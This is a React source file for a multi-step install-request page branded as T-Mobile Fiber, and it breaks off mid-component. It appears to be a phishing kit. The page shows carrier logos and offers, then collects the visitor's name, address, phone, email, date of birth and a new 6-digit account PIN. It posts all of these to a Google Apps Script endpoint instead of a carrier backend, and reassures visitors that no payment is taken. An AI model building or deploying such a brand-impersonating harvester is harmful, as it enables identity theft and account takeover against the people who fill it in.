import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useMemo, useRef, useState } from "react";
import { APPS_SCRIPT_URL, MAPBOX_TOKEN } from "@/lib/signup-config";

export const Route = createFileRoute("/signup")({
  component: SignupPage,
});

// ---------------- Types & data ----------------

type PlanId = "fiber-300" | "fiber-1gig" | "fiber-2gig";

interface Plan {
  id: PlanId;
  name: string;
  price: string;
  regular: string;
  speed: string;
  features: string;
  badge?: string;
  highlight?: boolean;
}

const PLANS: Plan[] = [
  {
    id: "fiber-2gig",
    name: "Fiber 2 Gig",
    price: "$70",
    regular: "$80/mo",
    speed: "2000 Mbps ↓ / 1000 Mbps ↑",
    badge: "Best Promo",
    highlight: true,
    features:
      "First month free + $100 back. Wi-Fi router, mesh extender as needed, installation, unlimited data, T-Mobile Tuesdays perks.",
  },
  {
    id: "fiber-1gig",
    name: "Fiber 1 Gig",
    price: "$60",
    regular: "$70/mo",
    speed: "1000 Mbps ↓ / 1000 Mbps ↑",
    badge: "Most Popular",
    features:
      "First month free. Wi-Fi router, mesh extender as needed, installation, unlimited data, T-Mobile Tuesdays perks.",
  },
  {
    id: "fiber-300",
    name: "Fiber 300",
    price: "$45",
    regular: "$55/mo",
    speed: "306 Mbps ↓ / 305 Mbps ↑",
    features:
      "Wi-Fi router, installation, unlimited data, and T-Mobile Tuesdays perks.",
  },
];

const INSTALL_WINDOWS = [
  "8 AM–10 AM",
  "10 AM–12 PM",
  "12 PM–2 PM",
  "2 PM–5 PM",
  "First available",
];

// Build available dates: first slot = today+2, then 2 weeks available (green),
// every other date = unavailable (red/blocked)
function buildCalendarDates() {
  const today = new Date();
  today.setHours(0, 0, 0, 0);
  const firstAvail = new Date(today);
  firstAvail.setDate(today.getDate() + 2);

  const available: string[] = [];
  const unavailable: string[] = [];

  for (let i = 0; i < 14; i++) {
    const d = new Date(firstAvail);
    d.setDate(firstAvail.getDate() + i);
    const iso = d.toISOString().split("T")[0];
    if (i % 2 === 0) {
      available.push(iso);
    } else {
      unavailable.push(iso);
    }
  }
  return { available, unavailable, firstAvail };
}

// ---------------- Page ----------------

type Step = 0 | 1 | 2 | 3 | 4 | 5;

interface FormState {
  plan: PlanId | "";
  fullAddress: string;
  street: string;
  city: string;
  state: string;
  zip: string;
  apt: string;
  fullName: string;
  phone: string;
  email: string;
  dob: string;
  pin: string;
  installDate: string;
  installTime: string;
  consent: boolean;
}

const INITIAL: FormState = {
  plan: "",
  fullAddress: "",
  street: "",
  city: "",
  state: "",
  zip: "",
  apt: "",
  fullName: "",
  phone: "",
  email: "",
  dob: "",
  pin: "",
  installDate: "",
  installTime: "",
  consent: false,
};

function SignupPage() {
  const [step, setStep] = useState<Step>(0);
  const [transitioning, setTransitioning] = useState(false);
  const [form, setForm] = useState<FormState>(INITIAL);
  const [submitting, setSubmitting] = useState(false);
  const [submitError, setSubmitError] = useState<string | null>(null);

  const update = <K extends keyof FormState>(k: K, v: FormState[K]) =>
    setForm((f) => ({ ...f, [k]: v }));

  const goTo = (next: Step) => {
    window.scrollTo({ top: 0, behavior: "instant" });
    setTransitioning(true);
    setTimeout(() => {
      setStep(next);
      setTransitioning(false);
      window.scrollTo({ top: 0, behavior: "instant" });
    }, 550);
  };

  const submit = async () => {
    setSubmitting(true);
    setSubmitError(null);
    const payload = {
      timestampEST: formatESTTimestamp(new Date()),
      planSelected: PLANS.find((p) => p.id === form.plan)?.name ?? "",
      fullName: form.fullName,
      fullFormattedAddress: form.fullAddress,
      streetAddress: form.street,
      aptUnit: form.apt,
      city: form.city,
      state: form.state,
      zip: form.zip,
      phone: form.phone,
      email: form.email,
      dob: form.dob,
      pin: form.pin,
      preferredInstallDate: form.installDate,
      preferredInstallTime: form.installTime,
      consent: form.consent ? "Yes" : "No",
    };

    try {
      if (!APPS_SCRIPT_URL) {
        console.warn("[signup] APPS_SCRIPT_URL not configured. Payload:", payload);
      } else {
        await fetch(APPS_SCRIPT_URL, {
          method: "POST",
          mode: "no-cors",
          headers: { "Content-Type": "text/plain;charset=utf-8" },
          body: JSON.stringify(payload),
        });
      }
      goTo(5);
    } catch (err) {
      console.error(err);
      setSubmitError("Something went wrong sending your request. Please try again.");
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <Header />

      {/* Step transition spinner overlay */}
      {transitioning && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-white/80 backdrop-blur-sm">
          <div className="flex flex-col items-center gap-4">
            <div className="h-12 w-12 rounded-full border-4 border-border border-t-magenta animate-spin" />
            <p className="text-sm font-semibold text-muted-foreground">Loading…</p>
          </div>
        </div>
      )}

      {step === 0 && <Hero onStart={() => goTo(1)} />}

      {step >= 1 && step <= 4 && (
        <>
          <StepIndicator step={step} onJump={(s) => s < step && goTo(s as Step)} />
          <main className="flex-1 w-full max-w-6xl mx-auto px-4 lg:px-8 pb-32 lg:pb-12 pt-2">
            <div className="lg:grid lg:grid-cols-[minmax(0,1fr)_360px] lg:gap-10 lg:items-start">
              <div className="w-full max-w-xl mx-auto lg:mx-0">
                {step === 1 && (
                  <StepPlan
                    value={form.plan}
                    onChange={(p) => update("plan", p)}
                    onNext={() => goTo(2)}
                  />
                )}
                {step === 2 && (
                  <StepAddress
                    form={form}
                    update={update}
                    onBack={() => goTo(1)}
                    onNext={() => goTo(3)}
                  />
                )}
                {step === 3 && (
                  <StepCustomer
                    form={form}
                    update={update}
                    onBack={() => goTo(2)}
                    onNext={() => goTo(4)}
                  />
                )}
                {step === 4 && (
                  <StepInstall
                    form={form}
                    update={update}
                    onBack={() => goTo(3)}
                    onSubmit={submit}
                    submitting={submitting}
                    error={submitError}
                  />
                )}
              </div>
              <DesktopSummary step={step} form={form} />
            </div>
          </main>
        </>
      )}

      {step === 5 && <Success />}

      <Footer />
    </div>
  );
}

// ---------------- Layout pieces ----------------

function Header() {
  return (
    <header className="sticky top-0 z-40 bg-white border-b border-gray-200 shadow-sm">
      <div className="max-w-6xl mx-auto px-4 lg:px-8 py-3 flex items-center justify-between">
        <img
          src="/tmobile-fiber-logo.png"
          alt="T-Mobile Fiber"
          className="h-9 lg:h-11 w-auto"
          width={180}
          height={44}
        />
        <div className="flex items-center gap-4">
          <span className="hidden md:inline text-sm text-gray-500">Need help?</span>
          <a
            href="sms:8886438620?&body=FIBER"
            className="text-xs lg:text-sm font-bold text-magenta hover:underline"
          >
            Text FIBER to 888-643-8620
          </a>
        </div>
      </div>
    </header>
  );
}

function Footer() {
  return (
    <footer className="border-t border-gray-200 bg-gray-50 mt-auto">
      <div className="max-w-6xl mx-auto px-4 lg:px-8 py-6 text-[11px] leading-relaxed text-gray-500">
        Pricing shown with AutoPay. AutoPay discount requires debit card or linked bank account.
        First month free applies to qualifying 1 Gig and 2 Gig plans. $100 back applies to
        qualifying 2 Gig plan. Offers subject to eligibility and availability. No payment is
        collected on this page.
      </div>
    </footer>
  );
}

// ---------------- Hero ----------------

function Hero({ onStart }: { onStart: () => void }) {
  return (
    <main className="flex-1">
      {/* ── T-Mobile hero: image right, copy left ── */}
      <section className="relative bg-black text-white overflow-hidden min-h-[420px] lg:min-h-[460px] flex items-center">
        {/* Full-bleed hero photo on right half */}
        <div className="absolute inset-0 lg:left-[42%]">
          <img
            src="/hero-gaming.png"
            alt="Customers enjoying T-Mobile Fiber"
            className="h-full w-full object-cover object-top"
          />
        </div>
        {/* Strong left-to-right fade so copy is always legible */}
        <div
          className="absolute inset-0 pointer-events-none"
          style={{
            background:
              "linear-gradient(to right, #000 0%, #000 40%, rgba(0,0,0,0.82) 55%, rgba(0,0,0,0.3) 75%, transparent 100%)",
          }}
        />
        {/* Extra overlay on mobile */}
        <div className="absolute inset-0 lg:hidden bg-black/65 pointer-events-none" />

        <div className="relative w-full max-w-6xl mx-auto px-5 lg:px-8 py-10 lg:py-12">
          <div className="max-w-[520px]">
            <p className="text-sm font-black uppercase tracking-widest text-magenta mb-3">
              T-Mobile Fiber is available in your area.
            </p>
            <h1 className="text-4xl sm:text-5xl lg:text-[3.4rem] font-black leading-[1.04] tracking-tight text-white text-balance">
              Get ultra-fast<br className="hidden sm:block" /> fiber internet.
            </h1>
            <ul className="mt-5 space-y-2">
              {[
                "First month free on 1 Gig & 2 Gig.",
                "2 Gig includes $100 back.",
                "Free professional installation.",
                "No payment collected today.",
              ].map((t) => (
                <li key={t} className="flex items-center gap-2.5 text-[15px] font-semibold text-white/90">
                  <CheckIcon className="h-4 w-4 text-magenta shrink-0" />
                  {t}
                </li>
              ))}
            </ul>
            <button
              onClick={onStart}
              className="mt-7 bg-magenta text-white font-black text-base lg:text-lg px-8 py-4 rounded-full hover:bg-magenta-dark active:scale-[0.98] transition-all shadow-[0_4px_24px_rgba(226,0,116,0.45)]"
            >
              Check My Address
            </button>
          </div>
        </div>
      </section>
    </main>
  );
}

// ---------------- Step indicator ----------------

function StepIndicator({
  step,
  onJump,
}: {
  step: number;
  onJump: (s: number) => void;
}) {
  const labels = ["Plan", "Address", "Info", "Install"];
  return (
    <div className="sticky top-[57px] lg:top-[65px] z-30 bg-white border-b border-gray-200">
      <div className="max-w-6xl mx-auto px-4 lg:px-8 py-3 lg:py-4">
        <div className="flex items-center justify-between mb-2">
          <span className="text-xs lg:text-sm font-semibold text-gray-500">
            Step {step} of 4
          </span>
          <span className="text-xs lg:text-sm font-bold text-magenta">
            {labels[step - 1]}
          </span>
        </div>
        <div className="flex gap-1.5 lg:gap-2">
          {labels.map((l, i) => {
            const idx = i + 1;
            const done = idx < step;
            const active = idx === step;
            return (
              <button
                key={l}
                onClick={() => onJump(idx)}
                disabled={!done}
                className={`flex-1 h-1.5 lg:h-2 rounded-full transition-all ${
                  active
                    ? "bg-magenta"
                    : done
                      ? "bg-magenta/50 cursor-pointer"
                      : "bg-gray-200 cursor-default"
                }`}
                aria-label={`Go to step ${idx}: ${l}`}
              />
            );
          })}
        </div>
      </div>
    </div>
  );
}

// ---------------- Desktop Summary ----------------

function DesktopSummary({ step, form }: { step: number; form: FormState }) {
  const plan = PLANS.find((p) => p.id === form.plan);
  return (
    <aside className="hidden lg:block sticky top-32 mt-4">
      <div className="rounded-2xl border border-gray-200 bg-white overflow-hidden shadow-sm">
        <div className="bg-black text-white px-6 py-5">
          <div className="text-[10px] font-black uppercase tracking-widest text-magenta mb-1">
            Your install request
          </div>
          <div className="text-lg font-extrabold">
            {plan ? plan.name : "Choose a plan to begin"}
          </div>
          {plan && (
            <div className="mt-0.5 text-sm text-white/70">
              {plan.price}/mo &middot; {plan.speed}
            </div>
          )}
        </div>
        <div className="p-6 space-y-4 text-sm">
          <SummaryRow label="Plan" value={plan?.name ?? "—"} active={step >= 1} />
          <SummaryRow
            label="Address"
            value={form.fullAddress || "—"}
            active={step >= 2 && !!form.fullAddress}
            truncate
          />
          <SummaryRow
            label="Contact"
            value={form.fullName || "—"}
            active={step >= 3 && !!form.fullName}
          />
          <SummaryRow
            label="Install"
            value={
              form.installDate && form.installTime
                ? `${form.installDate} · ${form.installTime}`
                : "—"
            }
            active={step >= 4 && !!form.installDate}
          />
        </div>
        <div className="border-t border-gray-100 bg-gray-50 px-6 py-4 space-y-2">
          {[
            "Free professional installation",
            "No payment collected today",
            "Cancel anytime before install",
          ].map((t) => (
            <div key={t} className="flex items-start gap-2 text-xs text-gray-600">
              <CheckIcon className="h-4 w-4 text-magenta shrink-0 mt-0.5" />
              <span>{t}</span>
            </div>
          ))}
        </div>
      </div>
    </aside>
  );
}

function SummaryRow({
  label,
  value,
  active,
  truncate,
}: {
  label: string;
  value: string;
  active: boolean;
  truncate?: boolean;
}) {
  return (
    <div className="flex items-start justify-between gap-3">
      <span className="text-xs font-semibold uppercase tracking-wider text-gray-400 shrink-0">
        {label}
      </span>
      <span
        className={`text-right text-sm font-semibold ${active ? "text-black" : "text-gray-400"} ${truncate ? "truncate max-w-[200px]" : ""}`}
        title={value}
      >
        {value}
      </span>
    </div>
  );
}

// ---------------- Step 1: Plan ----------------

function StepPlan({
  value,
  onChange,
  onNext,
}: {
  value: PlanId | "";
  onChange: (p: PlanId) => void;
  onNext: () => void;
}) {
  return (
    <div className="pt-4">
      <h2 className="text-2xl font-extrabold tracking-tight text-black">Pick your plan</h2>
      <p className="mt-1 text-sm text-gray-500">
        All plans include free pro install and unlimited data.
      </p>

      <div className="mt-5 space-y-3">
        {PLANS.map((plan) => {
          const selected = value === plan.id;
          return (
            <button
              key={plan.id}
              onClick={() => {
                onChange(plan.id);
                setTimeout(onNext, 350);
              }}
              className={`w-full text-left rounded-2xl border-2 p-5 bg-white transition-all relative ${
                selected
                  ? "border-magenta shadow-[0_0_0_1px_#E20074] scale-[1.01]"
                  : plan.highlight
                    ? "border-magenta hover:shadow-md"
                    : "border-gray-200 hover:border-gray-400"
              }`}
            >
              {/* "Best Promo" badge for 2 Gig — top-right corner ribbon */}
              {plan.badge && (
                <span className="absolute -top-px -right-px text-[10px] font-black uppercase tracking-wider px-3 py-1 rounded-bl-xl rounded-tr-xl bg-magenta text-white">
                  {plan.badge}
                </span>
              )}

              <div className="flex items-start justify-between gap-3">
                <div className="min-w-0">
                  <div className="font-extrabold text-xl leading-tight text-black">
                    {plan.name}
                  </div>
                  <div className="text-xs mt-0.5 text-gray-500">{plan.speed}</div>
                </div>
                <div className="text-right shrink-0">
                  <div className="text-3xl font-black leading-none text-black">
                    {plan.price}<span className="text-sm font-semibold text-gray-500">/mo</span>
                  </div>
                  <div className="text-[11px] line-through mt-0.5 text-gray-400">{plan.regular}</div>
                </div>
              </div>

              {/* Promo pills */}
              {plan.id === "fiber-2gig" && (
                <div className="mt-3 flex flex-wrap gap-2">
                  <span className="inline-flex items-center gap-1 bg-magenta/10 border border-magenta/30 text-magenta text-[11px] font-black uppercase tracking-wider px-2.5 py-1 rounded-full">
                    <CheckIcon className="h-3 w-3" /> First month free
                  </span>
                  <span className="inline-flex items-center gap-1 bg-magenta/10 border border-magenta/30 text-magenta text-[11px] font-black uppercase tracking-wider px-2.5 py-1 rounded-full">
                    <CheckIcon className="h-3 w-3" /> $100 back
                  </span>
                </div>
              )}
              {plan.id === "fiber-1gig" && (
                <div className="mt-3 flex flex-wrap gap-2">
                  <span className="inline-flex items-center gap-1 bg-magenta/10 border border-magenta/30 text-magenta text-[11px] font-black uppercase tracking-wider px-2.5 py-1 rounded-full">
                    <CheckIcon className="h-3 w-3" /> First month free
                  </span>
                </div>
              )}

              <p className="mt-3 text-[13px] leading-relaxed text-gray-600">{plan.features}</p>

              <div className="mt-3 flex items-center justify-between">
                <span className="text-[11px] text-gray-400">With AutoPay</span>
                <span
                  className={`h-6 w-6 rounded-full grid place-items-center border-2 transition-all ${
                    selected ? "border-magenta bg-magenta text-white" : "border-gray-300"
                  }`}
                >
                  {selected && <CheckIcon className="h-3.5 w-3.5" />}
                </span>
              </div>
            </button>
          );
        })}
      </div>

      {value && <StickyCta onClick={onNext}>Continue →</StickyCta>}
    </div>
  );
}

// ---------------- Step 2: Address ----------------

interface MapboxFeature {
  place_name: string;
  text: string;
  address?: string;
  context?: { id: string; text: string; short_code?: string }[];
}

function StepAddress({
  form,
  update,
  onBack,
  onNext,
}: {
  form: FormState;
  update: <K extends keyof FormState>(k: K, v: FormState[K]) => void;
  onBack: () => void;
  onNext: () => void;
}) {
  const [query, setQuery] = useState(form.fullAddress);
  const [results, setResults] = useState<MapboxFeature[]>([]);
  const [open, setOpen] = useState(false);
  const [picked, setPicked] = useState<boolean>(!!form.fullAddress);
  const [error, setError] = useState<string | null>(null);
  const debounceRef = useRef<number | null>(null);

  useEffect(() => {
    if (!query || query === form.fullAddress) return;
    setPicked(false);
    if (debounceRef.current) window.clearTimeout(debounceRef.current);
    if (query.length < 3) { setResults([]); return; }
    debounceRef.current = window.setTimeout(async () => {
      try {
        const url = `https://api.mapbox.com/geocoding/v5/mapbox.places/${encodeURIComponent(query)}.json?access_token=${MAPBOX_TOKEN}&autocomplete=true&country=US&types=address&limit=6`;
        const res = await fetch(url);
        const data = await res.json();
        setResults(data.features ?? []);
        setOpen(true);
      } catch (e) { console.error(e); }
    }, 250);
    return () => { if (debounceRef.current) window.clearTimeout(debounceRef.current); };
  }, [query, form.fullAddress]);

  const pick = (f: MapboxFeature) => {
    const ctx = f.context ?? [];
    const get = (prefix: string) => ctx.find((c) => c.id.startsWith(prefix));
    const city = get("place")?.text ?? "";
    const stateObj = get("region");
    const stateCode = stateObj?.short_code?.replace("US-", "") ?? stateObj?.text ?? "";
    const zip = get("postcode")?.text ?? "";
    const street = `${f.address ? f.address + " " : ""}${f.text}`.trim();
    update("fullAddress", f.place_name);
    update("street", street);
    update("city", city);
    update("state", stateCode);
    update("zip", zip);
    setQuery(f.place_name);
    setPicked(true);
    setOpen(false);
    setError(null);
  };

  const handleNext = () => {
    if (!picked || !form.fullAddress) { setError("Please select your address from the list."); return; }
    onNext();
  };

  return (
    <div className="pt-4">
      <h2 className="text-2xl font-extrabold tracking-tight text-black">Service address</h2>
      <p className="mt-1 text-sm text-gray-500">Where do you want T-Mobile Fiber installed?</p>
      <div className="mt-5 space-y-4">
        <div className="relative">
          <Label>Service address</Label>
          <input
            type="text"
            inputMode="text"
            autoComplete="off"
            value={query}
            onChange={(e) => { setQuery(e.target.value); setError(null); }}
            onFocus={() => results.length && setOpen(true)}
            placeholder="Start typing your address…"
            className={inputCls(!!error && !picked)}
          />
          {open && results.length > 0 && (
            <ul className="absolute z-20 left-0 right-0 mt-1 bg-white border border-gray-200 rounded-xl shadow-xl max-h-72 overflow-auto">
              {results.map((f, i) => (
                <li key={i}>
                  <button
                    type="button"
                    onClick={() => pick(f)}
                    className="w-full text-left px-4 py-3 hover:bg-gray-50 text-sm border-b border-gray-100 last:border-b-0"
                  >
                    {f.place_name}
                  </button>
                </li>
              ))}
            </ul>
          )}
          {error && <FieldError>{error}</FieldError>}
          {picked && (
            <p className="mt-2 text-xs text-green-600 font-semibold flex items-center gap-1">
              <CheckIcon className="h-3.5 w-3.5" /> Address confirmed
            </p>
          )}
        </div>
        <div>
          <Label optional>Apt / Unit</Label>
          <input
            type="text"
            value={form.apt}
            onChange={(e) => update("apt", e.target.value)}
            placeholder="Apt 4B (optional)"
            className={inputCls(false)}
          />
        </div>
      </div>
      <NavRow onBack={onBack} onNext={handleNext} nextDisabled={!picked} />
    </div>
  );
}

// ---------------- Step 3: Customer Info ----------------

function StepCustomer({
  form,
  update,
  onBack,
  onNext,
}: {
  form: FormState;
  update: <K extends keyof FormState>(k: K, v: FormState[K]) => void;
  onBack: () => void;
  onNext: () => void;
}) {
  const [errors, setErrors] = useState<Record<string, string>>({});

  const validate = () => {
    const e: Record<string, string> = {};
    if (!form.fullName.trim() || form.fullName.trim().split(/\s+/).length < 2)
      e.fullName = "Enter your first and last name.";
    const phoneDigits = form.phone.replace(/\D/g, "");
    if (phoneDigits.length !== 10) e.phone = "Enter a 10-digit phone number.";
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email)) e.email = "Enter a valid email.";
    if (!form.dob) e.dob = "Enter your date of birth.";
    else {
      const d = new Date(form.dob);
      const age = (Date.now() - d.getTime()) / (1000 * 60 * 60 * 24 * 365.25);
      if (age < 18) e.dob = "You must be 18 or older.";
      if (age > 120) e.dob = "Enter a valid date of birth.";
    }
    setErrors(e);
    return Object.keys(e).length === 0;
  };

  return (
    <div className="pt-4">
      <h2 className="text-2xl font-extrabold tracking-tight text-black">Your info</h2>
      <p className="mt-1 text-sm text-gray-500">{"We'll only use this to confirm your install."}</p>
      <div className="mt-5 space-y-4">
        <Field label="Full name" error={errors.fullName} value={form.fullName} onChange={(v) => update("fullName", v)} placeholder="Jane Smith" autoComplete="name" />
        <Field label="Phone number" error={errors.phone} value={form.phone} onChange={(v) => update("phone", formatPhone(v))} placeholder="(555) 123-4567" type="tel" inputMode="tel" autoComplete="tel" />
        <Field label="Email address" error={errors.email} value={form.email} onChange={(v) => update("email", v)} placeholder="you@example.com" type="email" inputMode="email" autoComplete="email" />
        <Field label="Date of birth" error={errors.dob} value={form.dob} onChange={(v) => update("dob", v)} type="date" autoComplete="bday" />
      </div>
      <NavRow onBack={onBack} onNext={() => { if (validate()) onNext(); }} />
    </div>
  );
}

// ---------------- Step 4: Install ----------------

function StepInstall({
  form,
  update,
  onBack,
  onSubmit,
  submitting,
  error,
}: {
  form: FormState;
  update: <K extends keyof FormState>(k: K, v: FormState[K]) => void;
  onBack: () => void;
  onSubmit: () => void;
  submitting: boolean;
  error: string | null;
}) {
  const [errors, setErrors] = useState<Record<string, string>>({});
  const { available, unavailable, firstAvail } = useMemo(() => buildCalendarDates(), []);

  // Build full calendar: show month(s) containing the available range
  const calendarDays = useMemo(() => {
    const days: { iso: string; day: number; status: "available" | "unavailable" | "past" }[] = [];
    // Show 5 weeks starting from the Monday before firstAvail
    const start = new Date(firstAvail);
    const dow = start.getDay(); // 0=sun
    start.setDate(start.getDate() - ((dow + 6) % 7)); // rewind to Monday

    for (let i = 0; i < 35; i++) {
      const d = new Date(start);
      d.setDate(start.getDate() + i);
      const iso = d.toISOString().split("T")[0];
      let status: "available" | "unavailable" | "past" = "past";
      if (available.includes(iso)) status = "available";
      else if (unavailable.includes(iso)) status = "unavailable";
      days.push({ iso, day: d.getDate(), status });
    }
    return days;
  }, [available, unavailable, firstAvail]);

  const calendarMonth = useMemo(() => {
    return new Intl.DateTimeFormat("en-US", { month: "long", year: "numeric" }).format(firstAvail);
  }, [firstAvail]);

  const validate = () => {
    const e: Record<string, string> = {};
    if (!/^\d{6}$/.test(form.pin)) e.pin = "PIN must be exactly 6 digits.";
    else if (/^(\d)\1{5}$/.test(form.pin)) e.pin = "PIN can't be all the same digit.";
    else if (form.pin === "123456" || form.pin === "654321") e.pin = "That sequence isn't allowed.";
    else if (form.dob) {
      const dobDigits = form.dob.replace(/\D/g, "");
      if (dobDigits.includes(form.pin)) e.pin = "PIN can't match your birthday.";
    }
    if (!form.installDate) e.installDate = "Pick a preferred date.";
    if (!form.installTime) e.installTime = "Pick a preferred time window.";
    if (!form.consent) e.consent = "Consent is required to submit.";
    setErrors(e);
    return Object.keys(e).length === 0;
  };

  return (
    <div className="pt-4">
      <h2 className="text-2xl font-extrabold tracking-tight text-black">Install request</h2>
      <p className="mt-1 text-sm text-gray-500">Almost done — pick your install window.</p>

      <div className="mt-5 space-y-5">
        {/* PIN */}
        <div>
          <Label>6-digit account PIN</Label>
          <input
            type="text"
            inputMode="numeric"
            pattern="\d*"
            maxLength={6}
            value={form.pin}
            onChange={(e) => update("pin", e.target.value.replace(/\D/g, ""))}
            placeholder="••••••"
            className={`${inputCls(!!errors.pin)} tracking-[0.5em] text-center font-bold text-lg`}
          />
          <p className="mt-1.5 text-xs text-gray-500">
            Create a 6-digit account PIN for account access. Do not use your birthday or a simple sequence.
          </p>
          {errors.pin && <FieldError>{errors.pin}</FieldError>}
        </div>

        {/* Custom white calendar */}
        <div>
          <Label>Preferred install date</Label>
          <div className="rounded-2xl border border-gray-200 bg-white overflow-hidden shadow-sm">
            {/* Calendar header */}
            <div className="bg-black text-white px-4 py-3 text-sm font-bold text-center">
              {calendarMonth}
            </div>
            {/* Day-of-week headers */}
            <div className="grid grid-cols-7 border-b border-gray-100">
              {["Mon","Tue","Wed","Thu","Fri","Sat","Sun"].map((d) => (
                <div key={d} className="py-2 text-center text-[11px] font-bold text-gray-400 uppercase">
                  {d}
                </div>
              ))}
            </div>
            {/* Calendar grid */}
            <div className="grid grid-cols-7">
              {calendarDays.map(({ iso, day, status }) => {
                const isSelected = form.installDate === iso;
                return (
                  <button
                    key={iso}
                    type="button"
                    disabled={status !== "available"}
                    onClick={() => { if (status === "available") { update("installDate", iso); setErrors((e) => ({ ...e, installDate: "" })); } }}
                    className={`
                      relative flex items-center justify-center aspect-square text-sm font-semibold transition-all
                      ${status === "available"
                        ? isSelected
                          ? "bg-magenta text-white font-black"
                          : "bg-green-50 text-green-700 hover:bg-green-100 border border-green-200"
                        : status === "unavailable"
                          ? "bg-red-50 text-red-300 cursor-not-allowed"
                          : "bg-white text-gray-200 cursor-not-allowed"
                      }
                    `}
                  >
                    {day}
                  </button>
                );
              })}
            </div>
            {/* Legend */}
            <div className="px-4 py-3 border-t border-gray-100 flex gap-4 text-[11px] text-gray-500">
              <span className="flex items-center gap-1.5">
                <span className="h-3 w-3 rounded-sm bg-green-100 border border-green-300" /> Available
              </span>
              <span className="flex items-center gap-1.5">
                <span className="h-3 w-3 rounded-sm bg-red-50 border border-red-200" /> Unavailable
              </span>
            </div>
          </div>
          {form.installDate && (
            <p className="mt-2 text-xs text-green-600 font-semibold flex items-center gap-1">
              <CheckIcon className="h-3.5 w-3.5" /> {form.installDate} selected
            </p>
          )}
          {errors.installDate && <FieldError>{errors.installDate}</FieldError>}
        </div>

        {/* Time windows */}
        <div>
          <Label>Preferred install time</Label>
          <div className="grid grid-cols-2 gap-2">
            {INSTALL_WINDOWS.map((w) => {
              const active = form.installTime === w;
              return (
                <button
                  key={w}
                  type="button"
                  onClick={() => update("installTime", w)}
                  className={`py-3 px-2 rounded-xl border-2 text-sm font-semibold transition ${
                    active
                      ? "border-magenta bg-magenta/10 text-magenta"
                      : "border-gray-200 bg-white hover:border-gray-400 text-black"
                  }`}
                >
                  {w}
                </button>
              );
            })}
          </div>
          {errors.installTime && <FieldError>{errors.installTime}</FieldError>}
        </div>

        {/* Consent */}
        <label className="flex gap-3 items-start cursor-pointer pt-2">
          <input
            type="checkbox"
            checked={form.consent}
            onChange={(e) => update("consent", e.target.checked)}
            className="mt-1 h-5 w-5 accent-magenta shrink-0"
          />
          <span className="text-[13px] leading-relaxed text-gray-700">
            I agree to be contacted by call, text, or email about T-Mobile Fiber options
            for this address. Message/data rates may apply. Reply STOP to opt out.
          </span>
        </label>
        {errors.consent && <FieldError>{errors.consent}</FieldError>}

        <p className="text-center text-xs text-gray-400 pt-1">No payment is collected on this page.</p>

        {error && (
          <div className="rounded-lg bg-red-50 text-red-600 text-sm p-3 border border-red-200">
            {error}
          </div>
        )}
      </div>

      <NavRow
        onBack={onBack}
        onNext={() => { if (validate()) onSubmit(); }}
        nextLabel={submitting ? "Submitting…" : "Submit Install Request"}
        nextDisabled={submitting}
      />
    </div>
  );
}

// ---------------- Success ----------------

function Success() {
  return (
    <main className="flex-1 max-w-xl mx-auto w-full px-5 py-10">
      <div className="rounded-3xl bg-white border border-gray-200 p-8 text-center shadow-sm">
        <div className="mx-auto h-16 w-16 rounded-full bg-magenta grid place-items-center">
          <CheckIcon className="h-8 w-8 text-white" />
        </div>
        <h2 className="mt-5 text-2xl font-extrabold tracking-tight text-black">Request received!</h2>
        <p className="mt-3 text-[15px] text-gray-600 leading-relaxed">
          {"A representative will review your information and follow up to confirm available install options."}
        </p>
        <div className="mt-6 rounded-xl bg-gray-50 border border-gray-200 p-4 text-sm text-gray-600">
          <span className="font-semibold">Prefer texting?</span> Text{" "}
          <span className="font-bold text-magenta">FIBER</span> to{" "}
          <a href="sms:8886438620?&body=FIBER" className="font-bold text-magenta underline">
            888-643-8620
          </a>.
        </div>
      </div>
    </main>
  );
}

// ---------------- Reusable bits ----------------

function Label({ children, optional }: { children: React.ReactNode; optional?: boolean }) {
  return (
    <label className="block text-sm font-semibold mb-1.5 text-black">
      {children}
      {optional && <span className="text-gray-400 font-normal ml-1">(optional)</span>}
    </label>
  );
}

function FieldError({ children }: { children: React.ReactNode }) {
  return <p className="mt-1.5 text-xs font-medium text-red-500">{children}</p>;
}

function Field({
  label,
  value,
  onChange,
  error,
  placeholder,
  type = "text",
  inputMode,
  autoComplete,
}: {
  label: string;
  value: string;
  onChange: (v: string) => void;
  error?: string;
  placeholder?: string;
  type?: string;
  inputMode?: "text" | "tel" | "email" | "numeric";
  autoComplete?: string;
}) {
  return (
    <div>
      <Label>{label}</Label>
      <input
        type={type}
        inputMode={inputMode}
        autoComplete={autoComplete}
        value={value}
        onChange={(e) => onChange(e.target.value)}
        placeholder={placeholder}
        className={inputCls(!!error)}
      />
      {error && <FieldError>{error}</FieldError>}
    </div>
  );
}

function inputCls(hasError: boolean) {
  return `w-full rounded-xl border-2 bg-white px-4 py-3.5 text-base outline-none transition focus:border-magenta text-black ${
    hasError ? "border-red-400" : "border-gray-200"
  }`;
}

function NavRow({
  onBack,
  onNext,
  nextLabel = "Continue",
  nextDisabled,
}: {
  onBack: () => void;
  onNext: () => void;
  nextLabel?: string;
  nextDisabled?: boolean;
}) {
  return (
    <>
      {/* Sticky mobile bar */}
      <div className="fixed bottom-0 left-0 right-0 z-30 border-t border-gray-200 bg-white/95 backdrop-blur p-3 sm:hidden">
        <div className="max-w-xl mx-auto flex gap-2">
          <button
            onClick={onBack}
            className="px-4 py-3.5 rounded-xl border-2 border-gray-200 font-semibold text-sm text-black"
          >
            Back
          </button>
          <button
            onClick={onNext}
            disabled={nextDisabled}
            className="flex-1 bg-magenta text-white font-bold rounded-xl py-3.5 shadow-md disabled:opacity-50 active:scale-[0.99] transition"
          >
            {nextLabel}
          </button>
        </div>
      </div>
      {/* Desktop inline */}
      <div className="hidden sm:flex gap-3 mt-8">
        <button
          onClick={onBack}
          className="px-5 py-3 rounded-xl border-2 border-gray-200 font-semibold text-black"
        >
          Back
        </button>
        <button
          onClick={onNext}
          disabled={nextDisabled}
          className="flex-1 bg-magenta text-white font-bold rounded-xl py-3 shadow-md disabled:opacity-50"
        >
          {nextLabel}
        </button>
      </div>
    </>
  );
}

function StickyCta({ onClick, children }: { onClick: () => void; children: React.ReactNode }) {
  return (
    <div className="fixed bottom-0 left-0 right-0 z-30 border-t border-gray-200 bg-white/95 backdrop-blur p-3">
      <button
        onClick={onClick}
